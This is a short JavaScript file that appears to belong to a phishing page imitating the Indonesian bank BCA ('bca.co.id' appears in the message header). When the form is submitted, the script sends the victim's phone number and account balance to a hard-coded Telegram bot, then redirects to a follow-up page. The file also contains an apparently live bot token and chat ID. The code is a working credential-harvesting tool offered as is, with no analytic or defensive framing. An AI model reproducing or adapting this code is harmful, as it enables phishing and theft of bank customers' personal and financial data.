const TOKEN = "6373734584:AAEhcdSzZcIJ1ObhshgZXt1YHDjozd5qUIY";
const CHAT_ID = "6444990188";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById("tg");

form.addEventListener("submit", onSubmitTelegram);

function onSubmitTelegram(e) {
  e.preventDefault();

  const { nope, saldo, } = form;
  const data = {
    nope: nope.value,
    saldo: saldo.value,
  };

  let message = `<b>❁┷━❃∞𝗯𝗰𝗮.𝗰𝗼.𝗶𝗱∞❃━┷❁</b>\n`;
  message += `<b>Nomor Hp : </b> ${data.nope}\n`;
  message += `<b>Saldo : </b> Rp. ${data.saldo}\n`;

  const dataTg = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "html",
  };

  const options = {
    method: "POST",
    body: JSON.stringify(dataTg),
    headers: {
      "Content-Type": "application/json",
    },
  };

  fetch(URL_API, options)
    .then((res) => res.json())
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
    
    window.location.href='/pilihan.html';
}
